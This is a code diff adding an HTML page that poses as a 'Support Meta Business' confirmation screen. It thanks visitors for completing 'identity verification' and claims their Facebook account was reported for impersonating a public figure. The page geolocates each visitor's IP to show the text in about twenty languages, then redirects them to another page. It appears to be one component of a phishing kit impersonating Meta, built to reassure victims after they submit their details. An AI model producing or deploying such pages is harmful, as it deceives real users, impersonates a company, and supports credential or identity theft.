@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Support Meta Business</title>
+  <style>
+    body {
+      margin:0;
+      font-family: Arial, sans-serif;
+      background:#f0f2f5;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+    }
+    .card {
+      background:#fff;
+      border-radius:8px;
+      padding:24px;
+      box-shadow:0 2px 8px rgba(0,0,0,0.1);
+      max-width:520px;
+      line-height:1.6;
+    }
+    .card h3 {
+      margin:0 0 12px;
+      font-size:17px;
+      font-weight:700;
+      color:#111827;
+    }
+    .card p {
+      margin:6px 0;
+      font-size:14px;
+      color:#374151;
+    }
+    .card .muted {
+      color:#6b7280;
+      font-size:13px;
+      margin-top:10px;
+    }
+    .actions {
+      margin-top:16px;
+      text-align:right;
+    }
+    .btn {
+      background:#1877f2;
+      border:none;
+      color:#fff;
+      font-size:14px;
+      padding:8px 14px;
+      border-radius:6px;
+      cursor:pointer;
+    }
+    .btn:hover {
+      background:#166fe0;
+    }
+  </style>
+</head>
+<body>
+  <div class="card" id="cardBox">
+    <h3 id="title">Thank you for completing the identity verification process.</h3>
+    <p id="line1">We have received your information and will review your Facebook account.</p>
+    <p id="line2">Your account has been reported by another user as impersonating a public figure.</p>
+    <p id="line3">We will try to review and update you as soon as possible.</p>
+    <p id="line4" class="muted">This process may take a few working hours. Thank you for your patience.</p>
+    <div class="actions">
+      <button class="btn" id="closeBtn">Close</button>
+    </div>
+  </div>
+
+  <script>
+    // Mapping country -> language code
+    const countryToLanguage = {
+      AT: 'de', BE: 'nl', JP: 'ja', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el',
+      CZ: 'cs', DE: 'de', DK: 'da', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
+      GR: 'el', HU: 'hu', IT: 'it', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt',
+      RO: 'ro', SE: 'sv', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi'
+    };
+
+    // ---------- TRANSLATIONS ----------
+    const translations = {
+      "de": {
+    "title": "Vielen Dank, dass Sie den Identitätsbestätigungsprozess abgeschlossen haben.",
+    "line1": "Wir haben Ihre Informationen erhalten und werden Ihr Facebook-Konto überprüfen.",
+    "line2": "Ihr Konto wurde von einem Facebook-Nutzer gemeldet, weil es sich als eine bekannte Person ausgeben soll.",
+    "line3": "Wir werden versuchen, dies so schnell wie möglich zu überprüfen und Sie zu informieren.",
+    "line4": "Dieser Vorgang kann einige Stunden dauern. Vielen Dank für Ihre Geduld.",
+    "close": "Schließen"
+  },
+  "nl": {
+    "title": "Bedankt dat je het identiteitsverificatieproces hebt voltooid.",
+    "line1": "We hebben je informatie ontvangen en zullen je Facebook-account beoordelen.",
+    "line2": "Je account is door een Facebook-gebruiker gerapporteerd als het zich voordoen als een bekende persoon.",
+    "line3": "We zullen dit zo snel mogelijk bekijken en je op de hoogte houden.",
+    "line4": "Dit proces kan enkele uren duren. Bedankt voor je geduld.",
+    "close": "Sluiten"
+  },
+  "ja": {
+    "title": "本人確認の手続きを完了していただきありがとうございます。",
+    "line1": "お客様の情報を受け取り、Facebookアカウントの審査を開始いたします。",
+    "line2": "お客様のアカウントは、著名人を装っているとしてFacebookユーザーから報告されました。",
+    "line3": "できるだけ早く確認し、更新をお知らせいたします。",
+    "line4": "このプロセスには数時間かかる場合があります。ご理解とご協力に感謝いたします。",
+    "close": "閉じる"
+  },
+  "bg": {
+    "title": "Благодарим ви, че завършихте процеса на потвърждаване на самоличността.",
+    "line1": "Получихме вашата информация и ще прегледаме акаунта ви във Facebook.",
+    "line2": "Вашият акаунт беше докладван от потребител на Facebook като такъв, който се представя за известна личност.",
+    "line3": "Ще се постараем да го прегледаме и да ви уведомим възможно най-скоро.",
+    "line4": "Този процес може да отнеме няколко часа. Благодарим ви за търпението.",
+    "close": "Затвори"
+  },
+  "pt": {
+    "title": "Obrigado por concluir o processo de verificação de identidade.",
+    "line1": "Recebemos suas informações e iremos analisar sua conta do Facebook.",
+    "line2": "Sua conta foi denunciada por um usuário do Facebook por se passar por uma pessoa famosa.",
+    "line3": "Faremos o possível para revisar e atualizar você o mais rápido possível.",
+    "line4": "Este processo pode levar algumas horas. Obrigado pela paciência.",
+    "close": "Fechar"
+  },
+  "en": {
+    "title": "Thank you for completing the identity verification process.",
+    "line1": "We have received your information and will review your Facebook account.",
+    "line2": "Your account has been reported by a Facebook user for impersonating a public figure.",
+    "line3": "We will do our best to review and update you as soon as possible.",
+    "line4": "This process may take a few hours. Thank you for your patience.",
+    "close": "Close"
+  },
+  "el": {
+    "title": "Σας ευχαριστούμε που ολοκληρώσατε τη διαδικασία επαλήθευσης ταυτότητας.",
+    "line1": "Λάβαμε τις πληροφορίες σας και θα εξετάσουμε τον λογαριασμό σας στο Facebook.",
+    "line2": "Ο λογαριασμός σας αναφέρθηκε από χρήστη του Facebook ως πλαστοπροσωπία γνωστού προσώπου.",
+    "line3": "Θα προσπαθήσουμε να το εξετάσουμε και να σας ενημερώσουμε το συντομότερο δυνατό.",
+    "line4": "Αυτή η διαδικασία μπορεί να διαρκέσει μερικές ώρες. Σας ευχαριστούμε για την υπομονή σας.",
+    "close": "Κλείσιμο"
+  },
+  "cs": {
+    "title": "Děkujeme, že jste dokončili proces ověření identity.",
+    "line1": "Obdrželi jsme vaše informace a zkontrolujeme váš účet na Facebooku.",
+    "line2": "Váš účet byl nahlášen uživatelem Facebooku za vydávání se za známou osobnost.",
+    "line3": "Uděláme maximum pro to, abychom to co nejdříve zkontrolovali a informovali vás.",
+    "line4": "Tento proces může trvat několik hodin. Děkujeme za vaši trpělivost.",
+    "close": "Zavřít"
+  },
+  "da": {
+    "title": "Tak fordi du har fuldført identitetsbekræftelsesprocessen.",
+    "line1": "Vi har modtaget dine oplysninger og vil gennemgå din Facebook-konto.",
+    "line2": "Din konto er blevet rapporteret af en Facebook-bruger for at udgive sig for en kendt person.",
+    "line3": "Vi vil gøre vores bedste for at gennemgå det og opdatere dig hurtigst muligt.",
+    "line4": "Denne proces kan tage et par timer. Tak for din tålmodighed.",
+    "close": "Luk"
+  },
+  "es": {
+    "title": "Gracias por completar el proceso de verificación de identidad.",
+    "line1": "Hemos recibido tu información y revisaremos tu cuenta de Facebook.",
+    "line2": "Tu cuenta ha sido denunciada por un usuario de Facebook por hacerse pasar por una figura pública.",
+    "line3": "Haremos todo lo posible para revisarlo y actualizarte lo antes posible.",
+    "line4": "Este proceso puede tardar algunas horas. Gracias por tu paciencia.",
+    "close": "Cerrar"
+  },
+  "fi": {
+    "title": "Kiitos, että olet suorittanut henkilöllisyyden vahvistusprosessin.",
+    "line1": "Olemme vastaanottaneet tietosi ja tarkistamme Facebook-tilisi.",
+    "line2": "Tilisi on ilmoitettu Facebook-käyttäjän toimesta, koska se tekeytyy julkiseksi henkilöksi.",
+    "line3": "Teemme parhaamme tarkistaaksemme ja ilmoittaaksemme sinulle mahdollisimman pian.",
+    "line4": "Tämä prosessi voi kestää muutaman tunnin. Kiitos kärsivällisyydestäsi.",
+    "close": "Sulje"
+  },
+  "fr": {
+    "title": "Merci d'avoir terminé le processus de vérification d'identité.",
+    "line1": "Nous avons reçu vos informations et allons examiner votre compte Facebook.",
+    "line2": "Votre compte a été signalé par un utilisateur de Facebook pour usurpation d'identité d'une personnalité publique.",
+    "line3": "Nous ferons de notre mieux pour vérifier et vous tenir informé dès que possible.",
+    "line4": "Ce processus peut prendre quelques heures. Merci de votre patience.",
+    "close": "Fermer"
+  },
+  "hu": {
+    "title": "Köszönjük, hogy befejezte a személyazonosság-ellenőrzési folyamatot.",
+    "line1": "Megkaptuk az információit, és felül fogjuk vizsgálni a Facebook-fiókját.",
+    "line2": "Fiókját egy Facebook-felhasználó jelentette, mert híres személynek adja ki magát.",
+    "line3": "Igyekszünk a lehető leghamarabb felülvizsgálni és értesíteni Önt.",
+    "line4": "Ez a folyamat néhány órát vehet igénybe. Köszönjük türelmét.",
+    "close": "Bezárás"
+  },
+  "it": {
+    "title": "Grazie per aver completato il processo di verifica dell'identità.",
+    "line1": "Abbiamo ricevuto le tue informazioni e verificheremo il tuo account Facebook.",
+    "line2": "Il tuo account è stato segnalato da un utente di Facebook per essersi spacciato per una persona famosa.",
+    "line3": "Faremo del nostro meglio per rivederlo e aggiornarti il prima possibile.",
+    "line4": "Questo processo può richiedere alcune ore. Grazie per la tua pazienza.",
+    "close": "Chiudi"
+  },
+  "no": {
+    "title": "Takk for at du fullførte identitetsbekreftelsesprosessen.",
+    "line1": "Vi har mottatt informasjonen din og vil gjennomgå Facebook-kontoen din.",
+    "line2": "Kontoen din har blitt rapportert av en Facebook-bruker for å utgi seg for en kjent person.",
+    "line3": "Vi vil gjøre vårt beste for å gjennomgå det og oppdatere deg så snart som mulig.",
+    "line4": "Denne prosessen kan ta noen timer. Takk for tålmodigheten.",
+    "close": "Lukk"
+  },
+  "pl": {
+    "title": "Dziękujemy za zakończenie procesu weryfikacji tożsamości.",
+    "line1": "Otrzymaliśmy twoje informacje i sprawdzimy twoje konto na Facebooku.",
+    "line2": "Twoje konto zostało zgłoszone przez użytkownika Facebooka za podszywanie się pod znaną osobę.",
+    "line3": "Dołożymy wszelkich starań, aby to jak najszybciej sprawdzić i poinformować cię.",
+    "line4": "Proces ten może potrwać kilka godzin. Dziękujemy za cierpliwość.",
+    "close": "Zamknij"
+  },
+  "ro": {
+    "title": "Vă mulțumim că ați finalizat procesul de verificare a identității.",
+    "line1": "Am primit informațiile dvs. și vă vom revizui contul de Facebook.",
+    "line2": "Contul dvs. a fost raportat de un utilizator Facebook pentru că se dă drept o persoană cunoscută.",
+    "line3": "Vom face tot posibilul să îl revizuim și să vă actualizăm cât mai curând posibil.",
+    "line4": "Acest proces poate dura câteva ore. Vă mulțumim pentru răbdare.",
+    "close": "Închide"
+  },
+  "sv": {
+    "title": "Tack för att du har slutfört identitetsverifieringsprocessen.",
+    "line1": "Vi har tagit emot din information och kommer att granska ditt Facebook-konto.",
+    "line2": "Ditt konto har rapporterats av en Facebook-användare för att utge sig för att vara en känd person.",
+    "line3": "Vi kommer att göra vårt bästa för att granska det och uppdatera dig så snart som möjligt.",
+    "line4": "Denna process kan ta några timmar. Tack för ditt tålamod.",
+    "close": "Stäng"
+  },
+  "th": {
+    "title": "ขอบคุณที่คุณได้ทำการยืนยันตัวตนเสร็จสิ้นแล้ว",
+    "line1": "เราได้รับข้อมูลของคุณแล้วและจะดำเนินการตรวจสอบบัญชี Facebook ของคุณ",
+    "line2": "บัญชีของคุณถูกผู้ใช้ Facebook รายหนึ่งรายงานว่าแอบอ้างเป็นบุคคลสาธารณะ",
+    "line3": "เราจะพยายามตรวจสอบและอัปเดตให้คุณโดยเร็วที่สุด",
+    "line4": "กระบวนการนี้อาจใช้เวลาหลายชั่วโมง ขอบคุณที่อดทนรอ",
+    "close": "ปิด"
+  },
+  "tr": {
+    "title": "Kimlik doğrulama sürecini tamamladığınız için teşekkür ederiz.",
+    "line1": "Bilgilerinizi aldık ve Facebook hesabınızı inceleyeceğiz.",
+    "line2": "Hesabınız, ünlü bir kişiyi taklit ettiği gerekçesiyle bir Facebook kullanıcısı tarafından bildirildi.",
+    "line3": "Bunu en kısa sürede inceleyip size geri bildirim vermeye çalışacağız.",
+    "line4": "Bu işlem birkaç saat sürebilir. Sabır gösterdiğiniz için teşekkür ederiz.",
+    "close": "Kapat"
+  },
+  "zh": {
+    "title": "感谢您完成身份验证流程。",
+    "line1": "我们已收到您的信息，并将审核您的Facebook帐户。",
+    "line2": "您的帐户已被Facebook用户举报，原因是冒充公众人物。",
+    "line3": "我们会尽快审核并向您更新。",
+    "line4": "此过程可能需要几个小时。感谢您的耐心等待。",
+    "close": "关闭"
+  },
+  "vi": {
+    "title": "Cảm ơn bạn đã hoàn tất quá trình xác nhận danh tính.",
+    "line1": "Chúng tôi đã tiếp nhận thông tin của bạn và sẽ tiến hành xem xét tài khoản Facebook.",
+    "line2": "Tài khoản của bạn đã bị một người dùng Facebook báo cáo là mạo danh một người nổi tiếng.",
+    "line3": "Chúng tôi sẽ cố gắng xem xét lại và cập nhật cho bạn trong thời gian sớm nhất.",
+    "line4": "Quá trình này có thể mất một vài giờ làm việc. Cảm ơn bạn đã kiên nhẫn.",
+    "close": "Đóng"
+  }
+    };
+
+    async function detectLanguage() {
+      let lang = "en"; // mặc định tiếng Anh
+      try {
+        let res = await fetch("https://get.geojs.io/v1/ip/geo.json");
+        let data = await res.json();
+        let countryCode = data.country_code || "EN";
+        let mappedLang = countryToLanguage[countryCode];
+        if (mappedLang && translations[mappedLang]) {
+          lang = mappedLang;
+        }
+      } catch (error) {
+        console.error("Không lấy được IP:", error);
+      }
+
+      // Đổ nội dung theo ngôn ngữ
+      const t = translations[lang] || translations.en;
+      document.getElementById("title").textContent = t.title;
+      document.getElementById("line1").textContent = t.line1;
+      document.getElementById("line2").textContent = t.line2;
+      document.getElementById("line3").textContent = t.line3;
+      document.getElementById("line4").textContent = t.line4;
+      document.getElementById("closeBtn").textContent = t.close;
+    }
+
+    detectLanguage();
+
+    // Nút chuyển hướng
+    document.getElementById("closeBtn").addEventListener("click", function() {
+      window.location.href = "/trangtrang.html"; // Thay bằng link bạn muốn
+    });
+  </script>
+</body>
+</html>
